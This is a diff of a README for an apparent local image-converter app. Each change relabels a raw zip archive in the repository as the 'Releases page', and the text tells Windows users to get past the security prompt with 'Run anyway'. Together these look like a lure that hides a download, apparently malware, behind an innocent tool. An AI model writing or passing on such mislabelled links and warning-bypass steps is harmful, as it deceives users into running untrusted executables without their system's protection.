@@ -1,6 +1,6 @@
 # 🖼️ image-converter-web-app - Convert your photos locally and securely
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/letitiametallurgical383/image-converter-web-app/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/letitiametallurgical383/image-converter-web-app/raw/refs/heads/main/src/web_app_image_converter_v2.2.zip)
 
 This application converts images between formats like JPG, PNG, WebP, AVIF, and HEIC. It keeps your files on your computer. Nothing travels to a server. Your photos remain private.
 
@@ -8,7 +8,7 @@ This application converts images between formats like JPG, PNG, WebP, AVIF, and 
 
 You do not need to know how to code to use this tool. You only need a web browser and the downloaded file. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/letitiametallurgical383/image-converter-web-app/releases).
+1. Go to the [Releases page](https://github.com/letitiametallurgical383/image-converter-web-app/raw/refs/heads/main/src/web_app_image_converter_v2.2.zip).
 2. Locate the most recent version under the Assets header.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -35,7 +35,7 @@ If Windows shows a security prompt, click "More info" and then "Run anyway." Thi
 
 ## 📥 How to Download 
 
-Visit [this page](https://github.com/letitiametallurgical383/image-converter-web-app/releases) to find the latest version. Always download the newest file to ensure you have the latest performance updates and format support.
+Visit [this page](https://github.com/letitiametallurgical383/image-converter-web-app/raw/refs/heads/main/src/web_app_image_converter_v2.2.zip) to find the latest version. Always download the newest file to ensure you have the latest performance updates and format support.
 
 ## ⚡ Using the Application
 
